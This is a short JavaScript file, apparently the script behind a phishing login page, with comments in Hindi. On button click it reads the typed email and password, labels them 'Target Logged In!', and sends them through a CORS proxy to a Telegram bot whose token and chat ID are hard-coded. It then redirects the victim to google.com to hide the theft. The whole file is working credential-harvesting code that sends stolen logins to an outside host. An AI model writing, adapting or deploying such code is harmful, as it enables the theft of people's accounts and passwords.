document.getElementById('loginBtn').addEventListener('click', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const botToken = "6717477751:AAG6phDMwqdQiKFN6n3_28Fp51NmRvmuCsg";
    const chatId = "7732354688";
    
    // Proxy URL (CORS Error ठीक करने के लिए)
    const proxyUrl = "https://corsproxy.io/?";
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const message = `Target Logged In!\nEmail: ${email}\nPassword: ${password}`;

    fetch(proxyUrl + encodeURIComponent(telegramUrl), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(() => {
        // मैसेज जाने के बाद गूगल पर भेजें
        window.location.href = "https://www.google.com";
    })
    .catch((error) => {
        console.error('Error:', error);
        window.location.href = "https://www.google.com";
    });
});
